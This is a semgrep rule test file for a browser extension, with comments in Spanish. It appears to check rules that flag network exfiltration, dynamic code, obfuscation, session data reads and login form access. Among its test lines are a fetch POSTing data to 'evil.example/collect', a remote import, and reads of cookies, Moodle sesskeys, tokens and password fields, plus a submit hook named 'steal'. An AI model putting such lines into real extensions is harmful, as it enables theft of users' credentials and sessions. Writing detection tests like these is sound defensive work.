// Casos de prueba de las reglas (semgrep --test). No es parte de la extensión.

// --- ba-network-request
// ruleid: ba-network-request
fetch('https://evil.example/collect', { method: 'POST', body: data });
// ruleid: ba-network-request
fetch(url);
// ruleid: ba-network-request
var x = new XMLHttpRequest();
// ruleid: ba-network-request
navigator.sendBeacon('/x', data);
// ruleid: ba-network-request
var ws = new WebSocket(addr);
// ruleid: ba-network-request
window.top.postMessage(data, '*');
// ok: ba-network-request
fetch(chrome.runtime.getURL('images/default1.jpg'));
function ok1(imagePath) {
  var fullUrl = chrome.runtime.getURL(imagePath);
  // ok: ba-network-request
  fetch(fullUrl).then(function (r) { return r.blob(); });
}

// --- ba-dynamic-code
// ruleid: ba-dynamic-code
eval(code);
// ruleid: ba-dynamic-code
var f = new Function('a', body);
// ruleid: ba-dynamic-code
setTimeout("alert(1)", 10);
// ruleid: ba-dynamic-code
import('https://evil.example/m.js');
// ruleid: ba-dynamic-code
var s = document.createElement('script');
// ok: ba-dynamic-code
setTimeout(function () {}, 10);

// --- ba-obfuscation
// ruleid: ba-obfuscation
var u = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGU=');
// ruleid: ba-obfuscation
var v = String.fromCharCode(104, 116, 116, 112);

// --- ba-session-data
// ruleid: ba-session-data
var c = document.cookie;
// ruleid: ba-session-data
var k = M.cfg.sesskey;
// ruleid: ba-session-data
var t = localStorage.getItem('token');
// ok: ba-session-data
chrome.storage.local.get(['courseConfig'], function () {});

// --- ba-login-form-access
// ruleid: ba-login-form-access
var p = document.querySelector('#password');
// ruleid: ba-login-form-access
var all = document.querySelectorAll('input[type="password"]');
// ruleid: ba-login-form-access
form.addEventListener('submit', steal);
// ruleid: ba-login-form-access
var fd = new FormData(form);
// ruleid: ba-login-form-access
var u2 = document.getElementById('username');
// ok: ba-login-form-access
var nav = document.querySelector('#usernavigation');
// ok: ba-login-form-access
var shell = document.querySelector('.login-shell');
